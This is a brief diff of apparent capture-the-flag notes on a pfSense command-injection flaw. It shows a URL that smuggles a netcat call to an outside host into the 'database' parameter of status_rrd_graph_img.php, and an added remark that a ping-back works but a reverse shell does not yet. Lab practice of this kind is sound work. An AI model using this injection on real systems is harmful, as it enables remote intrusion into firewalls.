@@ -48,3 +48,5 @@ https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injectio
 
 can execute command like this:
 https://10.10.10.60/status_rrd_graph_img.php?database=queues;nc+10.10.15.41+4444
+
+I can make the service ping me, but can't seems to get a reverse shell up.
